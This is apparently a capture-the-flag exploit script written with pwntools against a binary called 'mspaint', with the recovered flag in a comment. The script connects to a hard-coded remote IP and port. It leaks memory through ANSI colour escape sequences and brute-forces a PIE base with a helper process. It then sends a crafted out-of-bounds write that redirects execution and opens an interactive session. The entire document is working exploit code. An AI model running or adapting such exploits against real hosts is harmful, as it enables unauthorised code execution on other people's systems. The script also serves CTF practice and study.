# FLAG{ph0to5h0p_1s_4_n0obz}
from pwn import *

elf = ELF("./mspaint")
context.log_level = "ERROR"

while True:
	print ".",
	bf = process("./bruteforce")
	#target = process([elf.path])
	target = remote("143.255.251.233", 13371)

	target.sendlineafter(">", "2")

	for i in range(10):
		leak = 0
		target.recvuntil("\x1b[38;5;")
		leak += int(target.recvuntil(";48;5;", drop=True))
		leak += int(target.recvuntil("m#\x1b[38;5;", drop=True)) << 0x08
		leak += int(target.recvuntil(";48;5;", drop=True)) << 0x10
		leak += int(target.recvuntil("m#", drop=True)) << 0x18
		bf.sendline(str(leak))

	pie_leak = int(bf.recvline())
	bf.close()

	if pie_leak == -1 or pie_leak == -2:
		print("[-]Not Found!!!")
		continue
	#print("[+]PIE Leak: " + hex(pie_leak))

	target.sendlineafter(">", "0 " + str(0x420/4+2) + " " + str(0x92000000 + pie_leak - 0x1700 + 0x11e5))

	target.recvuntil("Invalid x,y...\n")
	try:
		print(target.recvline())
		break
	except:
		target.close()

target.interactive()
